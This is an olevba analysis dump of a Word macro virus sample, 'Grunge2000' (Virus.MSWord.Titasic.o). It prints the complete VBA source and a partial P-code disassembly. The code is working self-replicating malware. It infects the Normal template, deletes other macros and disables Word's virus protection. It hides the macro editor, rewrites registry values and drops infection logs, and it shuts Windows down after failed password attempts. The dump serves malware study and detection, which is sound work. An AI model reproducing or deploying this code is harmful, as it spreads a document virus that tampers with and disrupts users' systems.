olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titasic.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titasic.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GrungeStill.frm 
in file: ./Virus.MSWord.Titasic.o - OLE stream: 'Macros/VBA/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































Private Sub CmdOK_Click()
On Error Resume Next
Unload Me
End Sub
Private Sub UserForm_Layout()
On Error Resume Next
If (WeekDay(Date) = vbMonday) Or (WeekDay(Date) = vbSaturday) Then
    LblInfo.Caption = Chr(13) & "I'm not like them ,But I can pretend" & Chr(13) & _
                      "The sun is gone, But I have a light" & Chr(13) & _
                      "The day is gone, I'm having fun." & Chr(13) & Chr(13) & _
                      "Lyrics 'DUMB' by Kurt Cobain."
    Me.Height = 182.25
Else
    Me.Height = 95.25
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO GrungeKill.bas 
in file: ./Virus.MSWord.Titasic.o - OLE stream: 'Macros/VBA/GrungeKill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'*********************************************************
'*            Copyright By GRUNGE Family 2000            *
'*        Begin 10, Nov 2000, Bandung - Indonesia        *
'*                 Grunge Version-2000                   *
'*********************************************************
Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Public CekPas As Byte, Benar As Boolean
Public Const OpWord = "I Hate EveryBody If EveryBody Not Like Me"
Public Const ClWord = "The Sun Is Gone But I Have A Light", MG2 = "Macro$oft Grunge2000"
Public Const TMac = "Grunge protection on your document, please don't try again..."
Sub GrungeBersih(theObject As Object)
On Error Resume Next
For i = 1 To Application.VBE.VBProjects.Count
For Each NamaMAc In theObject.VBProject.VBComponents
If NamaMAc.Name <> "GrungeStill" And NamaMAc.Name <> "GrungeKill" And NamaMAc.Name <> "ThisDocument" Then
    Application.OrganizerDelete Source:=theObject.FullName, Name:=NamaMAc.Name, Object:=wdOrganizerObjectProjectItems
    Application.VBE.VBProjects.Item(NamaMAc).VBComponents.Remove NamaMAc
    Application.Caption = "Clean on Macro : " & NamaMAc.Name
End If
If NamaMAc.Name = "ThisDocumet" Then
   With remto.CodeModule
       .DeleteLines 1, .CountOfLines
   End With
End If
Next NamaMAc
Next i
End Sub
Sub SalinDocToTemp(CopyDari As Object, CopyKe As Object)
On Error Resume Next
Dim ATemp As Template
For Each ATemp In Templates
   Application.OrganizerCopy Source:=CopyDari.FullName, _
   Destination:=CopyKe.FullName, Name:="GrungeStill", Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=CopyDari.FullName, _
   Destination:=CopyKe.FullName, Name:="GrungeKill", Object:=wdOrganizerObjectProjectItems
Next ATemp
End Sub
Sub PanggilDoc()
On Error Resume Next
With Application
    SalinDocToTemp .ActiveDocument, .NormalTemplate
    .NormalTemplate.Save
End With
End Sub
Sub PanggilTemp()
On Error Resume Next
With Application
    SalinDocToTemp .NormalTemplate, .ActiveDocument
    .NormalTemplate.Save
End With
End Sub
Sub FileSave()
On Error Resume Next
CapWord "Saving Grunge2000, please wait...", 33
Saving
Documents.Save
End Sub
Sub AutoSave()
FileSave
End Sub
Sub AutoOpen()
On Error Resume Next
GrungeBersih ActiveDocument
GrungeCek
SalinKemana
GrungeSave
For i = 1 To 10: Application.CommandBars.Item(i).Protection = msoBarNoCustomize: Next i
End Sub
Sub FileOpen()
On Error Resume Next
CapWord MG2, 20
If Dialogs(wdDialogFileOpen).Show <> 0 Then
   AutoOpen
End If
CapWord OpWord, Len(OpWord)
GrungeSave
End Sub
Sub AutoClose()
On Error Resume Next
SalinKemana
CapWord MG2, 20
If ActiveDocument.Saved = True Then ActiveDocument.Save
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Grunge": System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Make Your Computer Dead..."
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s1159") = "Grunge": System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s2359") = "Grunge": System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "sTimeFormat") = "HH:mm:ss tt"
PathFile = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
MkDir (PathFile & "\Grunge Family")
Open PathFile & "\Grunge Family\" & Application.ActiveDocument.Name & ".ini" For Output As #1
 Print #1, "[Grunge Family Infected in Your Document]": Print #1, "=========================================": Print #1, "Date infected    : " & Format(Date, "DDDD, DD-MMMM-YYYY")
 Print #1, "Time infected    : " & Format(Time, "HH-MM-SS AMPM"): Print #1, "User Name        : " & UserName: Print #1, "FileName         : " & ActiveDocument.FullName: Print #1, "": Print #1, "Copyright by Grunge Viruses Version Grunge-D"
Close #1
End Sub
Sub AutoExit()
On Error Resume Next
If (WeekDay(Date) = vbTuesday) Or (WeekDay(Date) = vbFriday) Or (WeekDay(Date) = vbSunday) Then
On Error GoTo Salah
    GrungeStill.Show
    CapWord ClWord, Len(ClWord)
    Exit Sub
Salah:
    MsgBox OpWord, 16, MG2
    CapWord ClWord, Len(ClWord)
End If
End Sub
Sub viewvbcode()
ToolsMacro
End Sub
Sub ToggleFormsDesign()
ToolsMacro
End Sub
Sub viewcode()
ToolsMacro
End Sub
Sub FileClose()
On Error Resume Next
AutoClose
Application.ActiveDocument.Close
End Sub
Sub FileNewDefault()
On Error Resume Next
CapWord "Anyar Macro$oft Grunge2000", 24
WordBasic.FileNewDefault
SalinKemana
End Sub
Sub FileExit()
AutoClose
End Sub
Sub FileNew()
On Error Resume Next
If Dialogs(wdDialogToolsTemplates).Show <> 0 Then SalinKemana
End Sub
Sub HelpAbout()
Dim H
H = InputBox("I Hate EveryBody If EveryBody Not Like Me", "Grunge2000 Still A Live", "Kurt Cobain")
If H = "/\/\" Then
   WordBasic.DisableAutoMacros False
    Application.ShowVisualBasicEditor = True
    Else
        CekPas = CekPas + 1
        MsgBox "Anda memasukan Password salah, bila anda mencoba lagi maka" & Chr(13) & _
               "saya akan mematikan komputer ini,........??????", 16, "GRUNGE PASSWORD"
        If CekPas = 3 Then
           MsgBox "I Hate EveryBody If EveryBody Not Like Me, I Kill You Now........", 48, "Grunge2000 Warning !"
           ExitWindowsEx 1, 0
        End If
End If
End Sub
Sub ToolsMacro()
On Error Resume Next
Saving
GrungeStill.Show
CapWord TMac, Len(TMac)
Exit Sub
End Sub
Sub GrungeCek()
On Error Resume Next
Application.Options.VirusProtection = False
WordBasic.DisableAutoMacros False: Application.ShowVisualBasicEditor = False
ActiveDocument.CommandBars.Item(9).Enabled = False: ActiveDocument.CommandBars.Item(29).Enabled = False
UserName = "Grunge Still A Live": UserInitials = "Grunge": UserAddress = "www.Grunge-X.com"
End Sub
Sub AutoExec()
On Error Resume Next
GrungeSave
WordBasic.DisableAutoMacros True: Application.ShowVisualBasicEditor = False

End Sub
Sub CapWord(Nm As String, Pan As Integer)
On Error Resume Next
Application.Caption = ""
For i = 1 To Pan
  For K = 1 To 30000
  Next K
    Application.Caption = Mid$(Nm, 1, i)
Next i
End Sub
Sub Saving()
On Error Resume Next
With Application
   GrungeBersih .ActiveDocument
   GrungeBersih .NormalTemplate
   SalinKemana
   .ActiveDocument.Save
   .NormalTemplate.Save
   CapWord MG2, 20
End With
End Sub
Sub GrungeSave()
   Application.OnTime Now + TimeValue("00:00:04"), Name:="SalinKemana"
   Application.OnTime Now + TimeValue("00:00:05"), Name:="Saving"
End Sub
Sub SalinKemana()
Dim MacCek As Boolean
MacCek = False
For Each NamaMAc In NormalTemplate.VBProject.VBComponents
If NamaMAc.Name = "GrungeKill" Then
   MacCek = True
End If
Next NamaMAc
If MacCek = False Then
   PanggilDoc
   Else
   PanggilTemp
End If
End Sub






-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Titasic.o
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/GrungeStill - 2550 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' 	FuncDefn (Private Sub CmdOK_Click())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Private Sub UserForm_Layout())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbMonday 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSaturday 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #38:
' 	LineCont 0x000C 10 00 16 00 17 00 16 00 23 00 16 00
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0024 "I'm not like them ,But I can pretend"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0023 "The sun is gone, But I have a light"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0020 "The day is gone, I'm having fun."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001D "Lyrics 'DUMB' by Kurt Cobain."
' 	Concat 
' 	Ld LblInfo 
' 	MemSt Caption 
' Line #39:
' 	LitR8 0x0000 0x0000 0xC800 0x4066 
' 	Ld id_FFFF 
' 	MemSt Height 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	LitR8 0x0000 0x0000 0xD000 0x4057 
' 	Ld id_FFFF 
' 	MemSt Height 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	EndSub 
' Line #44:
' Macros/VBA/GrungeKill - 13487 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0039 "*********************************************************"
' Line #1:
' 	QuoteRem 0x0000 0x0039 "*            Copyright By GRUNGE Family 2000            *"
' Line #2:
' 	QuoteRem 0x0000 0x0039 "*        Begin 10, Nov 2000, Bandung - Indonesia        *"
' Line #3:
' 	QuoteRem 0x0000 0x0039 "*                 Grunge Version-2000                   *"
' Line #4:
' 	QuoteRem 0x0000 0x0039 "*********************************************************"
' Line #5:
' 	FuncDefn (Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long)
' Line #6:
' 	Dim (Public) 
' 	VarDefn CekPas (As Byte)
' 	VarDefn Benar (As Boolean)
' Line #7:
' 	Dim (Public Const) 
' 	LitStr 0x0029 "I Hate EveryBody If EveryBody Not Like Me"
' 	VarDefn OpWord
' Line #8:
' 	Dim (Public Const) 
' 	LitStr 0x0022 "The Sun Is Gone But I Have A Light"
' 	VarDefn ClWord
' 	LitStr 0x0014 "Macro$oft Grunge2000"
' 	VarDefn MG2
' Line #9:
' 	Dim (Public Const) 
' 	LitStr 0x003D "Grunge protection on your document, please don't try again..."
' 	VarDefn TMac
' Line #10:
' 	FuncDefn (Sub GrungeBersih(theObject As Object))
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	MemLd Count 
' 	For 
' Line #13:
' 	StartForVariable 
' 	Ld NamaMAc 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #14:
' 	Ld NamaMAc 
' 	MemLd New 
' 	LitStr 0x000B "GrungeStill"
' 	Ne 
' 	Ld NamaMAc 
' 	MemLd New 
' 	LitStr 0x000A "GrungeKill"
' 	Ne 
' 	And 
' 	Ld NamaMAc 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #15:
' 	Ld theObject 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NamaMAc 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #16:
' 	Ld NamaMAc 
' 	Ld NamaMAc 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #17:
' 	LitStr 0x0011 "Clean on Macro : "
' 	Ld NamaMAc 
' 	MemLd New 
' 	Concat 
' 	Ld Application 
' 	MemSt Caption 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld NamaMAc 
' 	MemLd New 
' 	LitStr 0x000B "ThisDocumet"
' 	Eq 
' 	IfBlock 
' Line #20:
' 	StartWithExpr 
' 	Ld remto 
' 	MemLd CodeModule 
' 	With 
' Line #21:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #22:
' 	EndWith 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld NamaMAc 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub SalinDocToTemp(CopyDari As Object, CopyKe As Object))
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	Dim 
' 	VarDefn ATemp
' Line #30:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #31:
' 	LineCont 0x0004 09 00 03 00
' 	Ld CopyDari 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld CopyKe 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "GrungeStill"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' 	LineCont 0x0004 09 00 03 00
' 	Ld CopyDari 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld CopyKe 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "GrungeKill"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #33:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub PanggilDoc())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #38:
' 	MemLdWith ActiveDocument 
' 	MemLdWith NormalTemplate 
' 	ArgsCall SalinDocToTemp 0x0002 
' Line #39:
' 	MemLdWith NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #40:
' 	EndWith 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Sub PanggilTemp())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #45:
' 	MemLdWith NormalTemplate 
' 	MemLdWith ActiveDocument 
' 	ArgsCall SalinDocToTemp 0x0002 
' Line #46:
' 	MemLdWith NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #47:
' 	EndWith 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub FileSave())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	LitStr 0x0021 "Saving Grunge2000, please wait..."
' 	LitDI2 0x0021 
' 	ArgsCall CapWord 0x0002 
' Line #52:
' 	ArgsCall Saving 0x0000 
' Line #53:
' 	Ld Documents 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub AutoSave())
' Line #56:
' 	ArgsCall FileSave 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub AutoOpen())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	Ld ActiveDocument 
' 	ArgsCall GrungeBersih 0x0001 
' Line #61:
' 	ArgsCall GrungeCek 0x0000 
' Line #62:
' 	ArgsCall SalinKemana 0x0000 
' Line #63:
' 	ArgsCall GrungeSave 0x0000 
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	Ld msoBarNoCustomize 
' 	Ld i 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Protection 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub FileOpen())
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	Ld MG2 
' 	LitDI2 0x0014 
' 	ArgsCall CapWord 0x0002 
' Line #69:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #70:
' 	ArgsCall AutoOpen 0x0000 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld OpWord 
' 	Ld OpWord 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #73:
' 	ArgsCall GrungeSave 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub AutoClose())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	ArgsCall SalinKemana 0x0000 
' Line #78:
' 	Ld MG2 
' 	LitDI2 0x0014 
' 	ArgsCall CapWord 0x0002 
' Line #79:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #80:
' 	LitStr 0x0006 "Grunge"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	LitStr 0x001A "Make Your Computer Dead..."
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #81:
' 	LitStr 0x0006 "Grunge"
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x0005 "s1159"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Grunge"
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x0005 "s2359"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	LitStr 0x000B "HH:mm:ss tt"
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x000B "sTimeFormat"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #82:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St PathFile 
' Line #83:
' 	Ld PathFile 
' 	LitStr 0x000E "\Grunge Family"
' 	Concat 
' 	Paren 
' 	ArgsCall MkDir 0x0001 
' Line #84:
' 	Ld PathFile 
' 	LitStr 0x000F "\Grunge Family\"
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0004 ".ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "[Grunge Family Infected in Your Document]"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "========================================="
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Date infected    : "
' 	Ld Date 
' 	LitStr 0x0012 "DDDD, DD-MMMM-YYYY"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Time infected    : "
' 	Ld Time 
' 	LitStr 0x000D "HH-MM-SS AMPM"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "User Name        : "
' 	Ld UserName 
' 	Concat 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "FileName         : "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "Copyright by Grunge Viruses Version Grunge-D"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub AutoExit())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbTuesday 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSunday 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #92:
' 	OnError Salah 
' Line #93:
' 	Ld GrungeStill 
' 	ArgsMemCall Show 0x0000 
' Line #94:
' 	Ld ClWord 
' 	Ld ClWord 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #95:
' 	ExitSub 
' Line #96:
' 	Label Salah 
' Line #97:
' 	Ld OpWord 
' 	LitDI2 0x0010 
' 	Ld MG2 
' 	ArgsCall MsgBox 0x0003 
' Line #98:
' 	Ld ClWord 
' 	Ld ClWord 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub viewvbcode())
' Line #102:
' 	ArgsCall ToolsMacro 0x0000 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub ToggleFormsDesign())
' Line #105:
' 	ArgsCall ToolsMacro 0x0000 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub viewcode())
' Line #108:
' 	ArgsCall ToolsMacro 0x0000 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Sub FileClose())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	ArgsCall AutoClose 0x0000 
' Line #113:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub FileNewDefault())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	LitStr 0x001A "Anyar Macro$oft Grunge2000"
' 	LitDI2 0x0018 
' 	ArgsCall CapWord 0x0002 
' Line #118:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' Line #119:
' 	ArgsCall SalinKemana 0x0000 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub FileExit())
' Line #122:
' 	ArgsCall AutoClose 0x0000 
' Line #123:
' 	EndSub 
' Line #124:
' 	FuncDefn (Sub FileNew())
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ArgsCall SalinKemana 0x0000 
' 	EndIf 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Sub HelpAbout())
' Line #129:
' 	Dim 
' 	VarDefn H
' Line #130:
' 	LitStr 0x0029 "I Hate EveryBody If EveryBody Not Like Me"
' 	LitStr 0x0017 "Grunge2000 Still A Live"
' 	LitStr 0x000B "Kurt Cobain"
' 	ArgsLd InputBox 0x0003 
' 	St H 
' Line #131:
' 	Ld H 
' 	LitStr 0x0004 "/\/\"
' 	Eq 
' 	IfBlock 
' Line #132:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #133:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #134:
' 	ElseBlock 
' Line #135:
' 	Ld CekPas 
' 	LitDI2 0x0001 
' 	Add 
' 	St CekPas 
' Line #136:
' 	LineCont 0x0004 08 00 0F 00
' 	LitStr 0x003A "Anda memasukan Password salah, bila anda mencoba lagi maka"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002F "saya akan mematikan komputer ini,........??????"
' 	Concat 
' 	LitDI2 0x0010 
' 	LitStr 0x000F "GRUNGE PASSWORD"
' 	ArgsCall MsgBox 0x0003 
' Line #137:
' 	Ld CekPas 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #138:
' 	LitStr 0x0041 "I Hate EveryBody If EveryBody Not Like Me, I Kill You Now........"
' 	LitDI2 0x0030 
' 	LitStr 0x0014 "Grunge2000 Warning !"
' 	ArgsCall MsgBox 0x0003 
' Line #139:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	EndSub 
' Line #143:
' 	FuncDefn (Sub ToolsMacro())
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' 	ArgsCall Saving 0x0000 
' Line #146:
' 	Ld GrungeStill 
' 	ArgsMemCall Show 0x0000 
' Line #147:
' 	Ld TMac 
' 	Ld TMac 
' 	FnLen 
' 	ArgsCall CapWord 0x0002 
' Line #148:
' 	ExitSub 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub GrungeCek())
' Line #151:
' 	OnError (Resume Next) 
' Line #152:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #153:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #154:
' 	LitVarSpecial (False)
' 	LitDI2 0x0009 
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitDI2 0x001D 
' 	Ld ActiveDocument 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #155:
' 	LitStr 0x0013 "Grunge Still A Live"
' 	St UserName 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Grunge"
' 	St UserInitials 
' 	BoS 0x0000 
' 	LitStr 0x0010 "www.Grunge-X.com"
' 	St UserAddress 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Sub AutoExec())
' Line #158:
' 	OnError (Resume Next) 
' Line #159:
' 	ArgsCall GrungeSave 0x0000 
' Line #160:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Application 
